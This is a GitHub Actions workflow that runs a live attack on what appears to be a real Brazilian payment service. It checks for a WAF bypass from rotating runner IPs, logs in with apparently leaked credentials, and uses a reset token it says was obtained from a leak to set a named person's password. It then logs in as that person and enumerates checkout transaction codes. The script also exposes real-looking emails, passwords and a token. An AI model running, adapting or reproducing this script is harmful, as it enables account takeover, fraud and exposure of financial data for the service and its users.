name: waf-reset-token-exploit
on:
  workflow_dispatch:
jobs:
  spray:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        attempt: [1, 2, 3]
      fail-fast: false
    steps:
    - name: Reset token exploit - attempt ${{ matrix.attempt }}
      run: |
        UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        BASE="https://wpdataservice.wisepay.com.br"
        
        MY_IP=$(curl -s https://api.ipify.org)
        RESP_CHECK=$(curl -s -m 15 -A "$UA" \
          -H "Content-Type: application/json" \
          -H "Origin: https://portal.wisepay.com.br" \
          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" \
          -H "type-application: web" \
          -X POST "$BASE/login" \
          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' \
          -w "\n%{http_code}")
        BODY=$(echo "$RESP_CHECK" | head -1)
        
        if ! echo "$BODY" | grep -qE "(Unauthorized|success|Forbidden)"; then
          echo "[${{ matrix.attempt }}] WAF blocking (IP: $MY_IP). Skip."
          exit 0
        fi
        echo "[${{ matrix.attempt }}] WAF BYPASSED (IP: $MY_IP)"
        
        echo ""
        echo "=== Testar token de reset de lenildo (capturado no LeakRadar) ==="
        LENILDO_TOKEN="39bf20e5965c0dcd2be2de52f030c8fd"
        curl -v -s -m 15 -A "$UA" \
          -H "Content-Type: application/json" \
          -H "type-application: web" \
          -H "Origin: https://portal.wisepay.com.br" \
          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
          -X PUT "$BASE/login/update-password/$LENILDO_TOKEN" \
          -d '{"password":"Lenildo@2024!","password_confirmation":"Lenildo@2024!"}' \
          -w "\nSTATUS:%{http_code}" 2>&1 | grep -E "(< HTTP|{.*}|STATUS)"
        
        echo ""
        echo "=== Se token válido -> login com nova senha ==="
        curl -s -m 15 -A "$UA" \
          -H "Content-Type: application/json" \
          -H "Origin: https://portal.wisepay.com.br" \
          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
          -H "type-application: web" \
          -X POST "$BASE/login" \
          -d '{"email":"lenildo.silva@outlook.com","password":"Lenildo@2024!"}' \
          -w "\nSTATUS:%{http_code}"
        
        echo ""
        echo "=== Buscar /checkout/status para transactionCodes válidos ==="
        for tid in "WP000001" "WP000002" "WP000003" "WP123456" "0000000001" "123456789"; do
          RESP=$(curl -s -m 10 -A "$UA" \
            -H "type-application: web" \
            "$BASE/checkout/status/$tid" \
            -w "\n%{http_code}")
          CODE=$(echo "$RESP" | tail -1)
          BODY=$(echo "$RESP" | head -1)
          if [ "$CODE" != "404" ]; then
            echo "CHECKOUT $tid: $CODE | $BODY"
          fi
        done
        
        echo ""
        echo "=== Buscar checkout/status com pattern analysis ==="
        # Try common transation code formats
        for tid in "WPTEST001" "WP20261125001" "TX123456" "PG000001"; do
          RESP=$(curl -s -m 10 -A "$UA" \
            -H "type-application: web" \
            "$BASE/checkout/status/$tid" \
            -w "\n%{http_code}")
          CODE=$(echo "$RESP" | tail -1)
          BODY=$(echo "$RESP" | head -1)
          echo "CHECKOUT $tid: $CODE | $(echo $BODY | head -c 100)"
        done
